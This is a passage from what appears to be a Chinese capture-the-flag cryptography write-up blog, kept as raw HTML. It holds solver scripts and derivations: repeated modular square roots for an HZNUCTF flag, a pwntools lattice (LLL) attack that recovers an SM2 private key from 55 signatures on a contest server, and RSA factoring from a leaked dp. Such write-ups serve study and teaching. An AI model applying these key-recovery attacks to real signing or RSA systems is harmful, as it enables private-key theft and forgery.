class="hljs-number">5610276127312766429915480651516095336201056367031530733662980757514427535721885723009367286870294772595629284861923351543396909892645845139050780691701736</span><br><span class="hljs-comment"># b&#x27;HZNUCTF&#123;80f937af-6542-4142-b957-09534839da4d&#125;&#x27;</span><br><br>e = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">24_000</span><br>q = hint // <span class="hljs-number">2024</span> + <span class="hljs-number">2022</span><br>p = n // q<br>res1 = [c]<br>total = []<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> tqdm.tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-number">24_000</span>)):<br>    tmp, res1 = res1, []<br>    <span class="hljs-keyword">for</span> ct <span class="hljs-keyword">in</span> tmp:<br>        mm = square_root_of_quadratic_residue(ct, p)<br>        <span class="hljs-keyword">if</span> mm <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> total:<br>            total.append(mm)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> p - mm <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> total:<br>            total.append(p - mm)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> mm == <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> mm == p - <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> mm == -<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">continue</span><br>        res1 += [mm, p - mm]<br>    res1 = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(res1))<br>res1 = res1[-<span class="hljs-number">2</span>:]<br><br>res2 = c<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm.tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-number">24000</span>)):<br>    res2 = <span class="hljs-built_in">pow</span>(res2, (q + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, q)<br>res2 = [res2, p - res2]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res1:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> res2:<br>        m = crt([p, q], [i, j])[<span class="hljs-number">0</span>]<br>        m = long_to_bytes(<span class="hljs-built_in">int</span>(m))<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;HZNUCTF&#x27;</span> <span class="hljs-keyword">in</span> m:<br>            <span class="hljs-built_in">print</span>(m)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment"># b&#x27;HZNUCTF&#123;80f937af-6542-4142-b957-09534839da4d&#125;\x97\x86w@b\x1e\xa36\xc7\xe4H5g5\x13\xca\x0f,&lt;\xa6\xb5\x16\x9ey\x92$\xd9\xd6\xa2~\x9f\xdagO\xbd\\3\x14\xfc\x05\xb8\x1f\r\xae2S\x1eA\x90\xaf&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="nothing">nothing</h2><p>sm2签名</p><p>hnp问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmssl <span class="hljs-keyword">import</span> sm2<br>alp=ascii_letters+digits<br><span class="hljs-built_in">print</span>(alp)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">proof_of_work</span>(<span class="hljs-params">end,sha</span>):<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> alp:<br>        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> alp:<br>            <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> alp:<br>                <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> alp:<br>                    start=a+b+c+d<br>                    s=(start+end).encode()<br>                    Sha=sha256(s).hexdigest()<br>                    <span class="hljs-keyword">if</span> Sha==sha:<br>                        <span class="hljs-keyword">return</span> start<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io=remote(<span class="hljs-string">&#x27;43.156.230.30&#x27;</span>,<span class="hljs-number">10001</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>io.recvuntil(<span class="hljs-string">&#x27;sha256(XXXX+&#x27;</span>)<br>end=io.recvuntil(<span class="hljs-string">&#x27;) == &#x27;</span>)[:-<span class="hljs-number">5</span>].decode()<br><span class="hljs-built_in">print</span>(end)<br>sha=io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].decode()<br><span class="hljs-built_in">print</span>(sha)<br>xxxx=proof_of_work(end,sha)<br>io.recvuntil(<span class="hljs-string">&#x27;[+] Plz tell me XXXX: &#x27;</span>)<br>io.sendline(xxxx)<br>io.recvuntil(<span class="hljs-string">&#x27;ready?[y/n]\n[*] &#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;y&#x27;</span>)<br>R=[]<br>S=[]<br>n=<span class="hljs-number">0xFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123</span><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">55</span>):<br>    io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;[+] U can get my signature\n&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;[+] &#x27;</span>)<br>    rs=io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].decode().zfill(<span class="hljs-number">128</span>)<br>    r,s=<span class="hljs-built_in">int</span>(rs[:<span class="hljs-number">64</span>],<span class="hljs-number">16</span>),<span class="hljs-built_in">int</span>(rs[<span class="hljs-number">64</span>:],<span class="hljs-number">16</span>)<br>    R.append(r)<br>    S.append(s)  <span class="hljs-comment">#ri,si</span><br>    <span class="hljs-comment">#s(1+d)=k-r*d mod n</span><br>    <span class="hljs-comment">#s+(s+r)*d=k mod n</span><br>    <br>M=Matrix(<span class="hljs-number">55</span>+<span class="hljs-number">2</span>,<span class="hljs-number">55</span>+<span class="hljs-number">2</span>)<br>M=Matrix(QQ,M)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">55</span>):<br>    M[i,i]=n<br>    M[-<span class="hljs-number">2</span>,i]=S[i]+R[i]<br>    M[-<span class="hljs-number">1</span>,i]=S[i]<br>M[-<span class="hljs-number">2</span>,-<span class="hljs-number">2</span>]=<span class="hljs-number">2</span>**<span class="hljs-number">245</span>/n<br>M[-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>]=<span class="hljs-number">2</span>**<span class="hljs-number">245</span><br>v=M.LLL()[<span class="hljs-number">1</span>]<br>sk=<span class="hljs-built_in">int</span>(v[-<span class="hljs-number">2</span>]*n/(<span class="hljs-number">2</span>**<span class="hljs-number">245</span>))<br>sk=n-sk  <span class="hljs-comment">#sk  #格子</span><br><br>sm2_easy = sm2.CryptSM2(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)  <span class="hljs-comment">#sm2</span><br>pk = sm2_easy._kg(sk, sm2_easy.ecc_table[<span class="hljs-string">&#x27;g&#x27;</span>]) <span class="hljs-comment">#</span><br>io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;I will give you the flag you want!(hexadecimal format)\n[*] &#x27;</span>)<br><span class="hljs-built_in">print</span>(pk)<br>io.sendline(<span class="hljs-built_in">hex</span>(sk))<br>io.recvall()<br></code></pre></td></tr></table></figure><h1 id="NKCTF招新赛">NKCTF招新赛</h1><h2 id="baby-RSA">baby_RSA</h2><p>考点：</p><ol><li>已知<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo separator="true">,</mo><mi>d</mi><mi>p</mi><mo separator="true">,</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">e,dp,n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span>分解<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span></li><li>费马小定理，数论推导</li><li>coppersmith攻击</li></ol><p>第一步：已知<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mi>p</mi></msub><mo>=</mo><mi>d</mi><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d_p=d \mod {(p-1)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，所以<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>∗</mo><msub><mi>d</mi><mi>p</mi></msub><mo>=</mo><mi>e</mi><mo>∗</mo><mi>d</mi><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e*d_p=e*d \mod {(p-1)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>。</p><p>根据RSA参数之间的关系有：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>∗</mo><mi>d</mi><mo>=</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e*d=1\mod{(p-1)*(q-1)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，那么<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>∗</mo><mi>d</mi><mo>=</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">e*d=1\mod{p-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>。</p><p>所以<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>∗</mo><msub><mi>d</mi><mi>p</mi></msub><mo>=</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">e*d_p=1\mod{p-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，即存在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>使得<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>∗</mo><msub><mi>d</mi><mi>p</mi></msub><mo>−</mo><mn>1</mn><mo>=</mo><mi>k</mi><mo>∗</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e*d_p-1=k*(p-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，注意到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mi>p</mi></msub><mo>&lt;</mo><mi>p</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">d_p&lt;p-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，那么<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>&lt;</mo><mi>e</mi></mrow><annotation encoding="application/x-tex">k&lt;e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">e</span></span></span></span>。</p><p>那么通过枚举<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>可以得到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>=</mo><mn>1</mn><mo>+</mo><mo stretchy="false">(</mo><mi>e</mi><mo>∗</mo><msub><mi>d</mi><mi>p</mi></msub><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">p=1+(e*d_p-1)//k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">//</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>。</p><p>第二步：有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mo>=</mo><msup><mi>m</mi><mi>p</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mo separator="true">,</mo><msub><mi>c</mi><mn>2</mn></msub><mo>=</mo><msup><mi>m</mi><mi>q</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c_1=m^p\mod{n},c_2=m^q\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span 